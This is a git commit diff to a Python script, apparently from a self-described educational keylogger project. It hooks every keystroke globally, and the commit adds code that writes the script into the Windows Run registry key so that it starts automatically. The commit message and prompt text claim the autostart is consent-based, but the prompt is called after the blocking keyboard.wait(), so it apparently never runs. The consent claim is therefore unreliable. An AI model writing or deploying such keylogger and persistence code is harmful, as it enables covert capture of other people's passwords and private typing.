3f2ef63f25848522dda1ece3a8eb728cdbcf689c
Selcuk58 <sel.demircan01@gmail.com>
2026-03-15 20:09:55 +0100

    implemented autostart with consent

--- main.py
+++ main.py
@@ -1,7 +1,36 @@
 
 import keyboard
 from datetime import datetime
+import winreg
+import os
 
+
+def add_to_autostart():
+    app_name = "KeyLoggerLab"
+    app_path = os.path.abspath(__file__)
+    key = winreg.OpenKey(
+        winreg.HKEY_CURRENT_USER,
+        r"Software\Microsoft\Windows\CurrentVersion\Run",
+        0,
+        winreg.KEY_SET_VALUE
+    )
+
+    winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, app_path)
+    winreg.CloseKey(key)
+
+def consentAutostart():
+ print("Educational KeyLogger Demo")
+ print("This program can add itself to Windows autostart.")
+ print("All logs stay locally on your computer.")
+ consent = input("Allow this program to add itself to autostart? (yes/no)")
+ if consent.lower() == "yes":
+   print("autostart enabled")
+   add_to_autostart()
+ elif consent.lower() == "no":
+   print("autostart not enabled")
+ else:
+  print("You can only answer with yes or no")
+ 
 
 def KeyLog(event):
     
@@ -15,3 +44,5 @@ def KeyLog(event):
 
 keyboard.hook(KeyLog)
 keyboard.wait()
+
+consentAutostart()
